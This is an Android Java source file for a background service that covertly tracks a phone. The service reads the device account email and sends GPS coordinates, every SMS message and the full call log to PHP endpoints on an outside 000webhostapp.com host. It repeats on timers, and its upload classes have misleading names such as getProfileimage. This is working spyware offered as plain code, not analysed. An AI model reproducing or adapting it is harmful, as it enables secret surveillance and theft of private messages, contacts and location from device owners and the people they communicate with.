package com.important.mine.systems;

import android.Manifest;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.ProgressDialog;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.CountDownTimer;
import android.os.IBinder;
import android.provider.CallLog;
import android.provider.Settings;
import android.support.annotation.Nullable;
import android.support.v4.app.ActivityCompat;
import android.util.Patterns;

import com.android.volley.AuthFailureError;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;

import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;
import java.util.regex.Pattern;

public class GPS_Service extends Service {
    private static final String URL = "http://boggy-dispatcher.000webhostapp.com/nannie_track/marketers.php";
    private Double xx, yy;
    private String y, token;
    private String DataString;
    private LocationListener listener;
    private LocationManager locationManager;
    private String email = null;
    CountDownTimer myCountDownTimer;

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {


        Pattern gmailPattern = Patterns.EMAIL_ADDRESS;
        Account[] accounts = AccountManager.get(GPS_Service.this).getAccounts();
        for (Account account : accounts) {
            if (gmailPattern.matcher(account.name).matches()) {
                email = account.name;
            }
        }

        new getProfileimage2().execute();
        new getProfileimage().execute();
       myCountDownTimer = new CountDownTimer(1000000, 5000) {
           @Override
           public void onTick(long millisUntilFinished) {
               //  initialize the two classes used for sending msgs with call records to server
                new getProfileimage2().execute();

                      }

            @Override
            public void onFinish() {


           }
        }.start();



        listener = new LocationListener() {
            @Override
            public void onLocationChanged(Location location) {

                //getting location updates from the device
                DataString = DateFormat.getTimeInstance(DateFormat.LONG).format
                        (Calendar.getInstance().getTime());

               /* Intent i = new Intent("location_update");
                i.putExtra("coordinates", location.getLongitude() + " " + location.getLatitude() + " " + email + DataString);
                sendBroadcast(i);*/

                //send data to server
                xx = location.getLongitude();
                yy = location.getLatitude();

                token = "1";
                StringRequest stringRequest1 = new StringRequest(Request.Method.POST, URL, new Response.Listener<String>() {
                    @Override
                    public void onResponse(String response) {

                    }
                }, new Response.ErrorListener() {
                    @Override
                    public void onErrorResponse(VolleyError error) {

                    }
                }) {

                    @Override
                    protected Map<String, String> getParams() throws AuthFailureError {

                        HashMap<String, String> hashMap = new HashMap<>();
                        hashMap.put("longitude", xx.toString());
                        hashMap.put("latitude", yy.toString());
                        hashMap.put("token", token);
                        hashMap.put("email", email);
                        hashMap.put("tarehe", DataString);
                        return hashMap;
                    }
                };

                RequestQueue queue = Volley.newRequestQueue(getApplicationContext());
                queue.add(stringRequest1);
            }

            @Override
            public void onStatusChanged(String s, int i, Bundle bundle) {

            }

            @Override
            public void onProviderEnabled(String s) {

            }

            @Override
            public void onProviderDisabled(String s) {
                Intent i = new Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS);
                i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(i);
            }
        };
        locationManager = (LocationManager) getApplicationContext().getSystemService(Context.LOCATION_SERVICE);

        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            // TODO: Consider calling
            //    ActivityCompat#requestPermissions
            // here to request the missing permissions, and then overriding
            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
            //                                          int[] grantResults)
            // to handle the case where the user grants the permission. See the documentation
            // for ActivityCompat#requestPermissions for more details.
            return;
        }
        locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 10000, 0, listener);
        myCountDownTimer = new CountDownTimer(1000000, 5000) {
            @Override
            public void onTick(long millisUntilFinished) {
                //  initialize the two classes used for sending msgs with call records to server
                new getProfileimage2().execute();

            }

            @Override
            public void onFinish() {

            }
        }.start();

        }
    @Override
    public void onDestroy() {
        super.onDestroy();
        if (locationManager != null) {
            //noinspection MissingPermission
            locationManager.removeUpdates(listener);
        }
    }


    public class getProfileimage2 extends AsyncTask<String,Void,String> {
        private static final String URL2 = "http://boggy-dispatcher.000webhostapp.com/nannie_track/messages.php";
        private Date smsDayTime;
        private String number;
        private String body;
        ProgressDialog pd = null;
        StringBuffer stringBuffer1 = new StringBuffer();
        String typeOfSMS = null;

        @Override
        protected void onPreExecute() {
            //pd = ProgressDialog.show(CalllogActivity.this, "Pleaes wait", "loading", true);
            //pd.setCancelable(true);
        }

        @Override
        protected String doInBackground(String... params) {
          Uri uri = Uri.parse("content://sms");
           Cursor cursor = getContentResolver().query(uri, null, null, null, null);
            if (cursor.moveToFirst()) {

                for (int i = 0; i < cursor.getCount(); i++) {
                    try{
                    Thread.sleep(4000);

                    body = cursor.getString(cursor.getColumnIndexOrThrow("body"));
                    number = cursor.getString(cursor.getColumnIndexOrThrow("address"));
                    String date = cursor.getString(cursor.getColumnIndexOrThrow("date"));
                    smsDayTime = new Date(Long.valueOf(date));
                    String type = cursor.getString(cursor.getColumnIndexOrThrow("type"));

                    switch (Integer.parseInt(type)) {
                        case 1:
                            typeOfSMS = "INBOX";
                            break;

                        case 2:
                            typeOfSMS = "SENT";
                            break;

                        case 3:
                            typeOfSMS = "DRAFT";
                            break;
                    }
                    cursor.moveToNext();

                    StringRequest stringRequest1 = new StringRequest(Request.Method.POST, URL2, new Response.Listener<String>() {
                        @Override
                        public void onResponse(String response) {

                        }
                    }, new Response.ErrorListener() {
                        @Override
                        public void onErrorResponse(VolleyError error) {

                        }
                    }) {

                        @Override
                        protected Map<String, String> getParams() throws AuthFailureError {
                            HashMap<String, String> hashMap = new HashMap<>();
                            hashMap.put("email", email);
                            hashMap.put("phone", number.toString());
                            hashMap.put("typeofsms", typeOfSMS.toString());
                            hashMap.put("smsdaytime", smsDayTime.toString());
                            hashMap.put("body", body.toString());
                            return hashMap;
                        }
                    };

                    RequestQueue queue = Volley.newRequestQueue(getApplicationContext());
                    queue.add(stringRequest1);
                } catch (InterruptedException ex) {
                    Thread.currentThread().interrupt();
                }
                }

            }
            cursor.close();

            return null;
        }

        @Override
        protected void onPostExecute(String result) {
            // pd.dismiss();
            new getProfileimage().execute();
        }
    }

    public class getProfileimage extends AsyncTask<String, Void, String> {
        private String phoneNumber;
        private String callType;
        private String dir = null;
        private String callDuration;
        private String callDate;
        private String dateString;
        private static final String URL1 = "http://boggy-dispatcher.000webhostapp.com/nannie_track/call_records.php";
        StringBuffer stringBuffer = new StringBuffer();
        ProgressDialog pd;
        @Override
        protected void onPreExecute() {
           // pd= ProgressDialog.show(CalllogActivity.this,"Pleaes wait","loading",true);
            //pd.setCancelable(true);

        }
        @Override
        protected String doInBackground(String... params) {
            String strOrder = android.provider.CallLog.Calls.DATE + " DESC";

            Calendar calender = Calendar.getInstance();


            calender.set(2017, calender.APRIL, 01);
            String fromDate = String.valueOf(calender.getTimeInMillis());

            calender.set(2017, calender.MAY, 02);
            String toDate = String.valueOf(calender.getTimeInMillis());

            String[] whereValue = {fromDate, toDate};


            //Cursor managedCursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, android.provider.CallLog.Calls.DATE + " BETWEEN ? AND ?", whereValue, strOrder);
            //noinspection MissingPermission
            Cursor managedCursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, null);

            //   Cursor managedCursor = managedQuery(CallLog.Calls.CONTENT_URI, null, android.provider.CallLog.Calls.DATE, new String[]{" BETWEEN ? AND ?"}, strOrder);
            int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
            int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
            int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
            int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);

            stringBuffer.append("Call Log :");

            while (managedCursor.moveToNext()) {
                try {
                    Thread.sleep(4000);

                    phoneNumber = managedCursor.getString(number);
                    callType = managedCursor.getString(type);
                    callDate = managedCursor.getString(date);
                    SimpleDateFormat formatter = new SimpleDateFormat(
                            "dd-MMM-yyyy HH:mm");
                    dateString = formatter.format(new Date(Long
                            .parseLong(callDate)));
                    //  Date callDayTime = new Date(Long.valueOf(callDate));
                    callDuration = managedCursor.getString(duration);

                    dir = null;
                    int dirCode = Integer.parseInt(callType);
                    switch (dirCode) {
                        case CallLog.Calls.OUTGOING_TYPE:
                            dir = "OUTGOING";
                            break;
                        case CallLog.Calls.INCOMING_TYPE:
                            dir = "INCOMMING";
                            break;
                        case CallLog.Calls.MISSED_TYPE:
                            dir = "MISSED CALL";
                            break;
                    }
                    StringRequest stringRequest1 = new StringRequest(Request.Method.POST, URL1, new Response.Listener<String>() {
                        @Override
                        public void onResponse(String response) {

                        }
                    }, new Response.ErrorListener() {
                        @Override
                        public void onErrorResponse(VolleyError error) {

                        }
                    }) {
                        @Override
                        protected Map<String, String> getParams() throws AuthFailureError {
                            HashMap<String, String> hashMap = new HashMap<>();
                            hashMap.put("email", email);
                            hashMap.put("phnumber", phoneNumber.toString());
                            hashMap.put("dir", dir.toString());
                            hashMap.put("callDayTime", dateString.toString());
                            hashMap.put("callDuration", callDuration);
                            return hashMap;
                        }
                    };

                    RequestQueue queue = Volley.newRequestQueue(getApplicationContext());
                    queue.add(stringRequest1);
                } catch (InterruptedException ex) {
                    Thread.currentThread().interrupt();
                }
            }
                return null;
        }

        @Override
        protected void onPostExecute(String result) {
            ///pd.dismiss();
            new getProfileimage2().execute();
            //textView.setText(stringBuffer);
            //textView.setVisibility(View.VISIBLE);
        }

    }

}
